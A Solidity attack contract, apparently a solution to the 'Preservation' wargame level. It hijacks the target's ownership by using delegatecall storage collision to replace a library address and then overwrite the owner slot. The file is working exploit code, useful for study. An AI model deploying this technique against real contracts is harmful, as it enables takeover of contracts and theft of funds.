// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface Preservation{
    function setFirstTime(uint _timeStamp) external;
    function owner() external view returns (address);
    function timeZone1Library() external view returns(address);
}

contract PreservationAttack{
   address slot0;
   address slot1; 
   address public ownerSlot;

    function attack(address target, address newOwner) external{
        Preservation pres = Preservation(target);
        pres.setFirstTime(uint160(address(this)));
        pres.setFirstTime(uint160(newOwner));
    }

    function setTime(uint _time) public {
      ownerSlot = address(uint160(_time));
     }
}